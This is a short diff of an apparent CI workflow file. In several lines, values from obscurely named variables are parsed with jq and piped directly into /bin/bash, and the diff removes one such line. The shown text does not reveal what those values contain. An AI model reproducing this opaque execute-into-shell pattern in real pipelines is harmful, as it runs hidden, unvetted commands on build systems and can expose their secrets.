@@ -24,7 +24,6 @@ jobs:
           echo $zhf1 | jq -r .qe4 | /bin/bash
           echo $ysa5 | jq -r .jrzjd7 | /bin/bash
           echo $i09 | jq -r .om471 | /bin/bash
-          echo $e4 | jq -r .kfre8 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
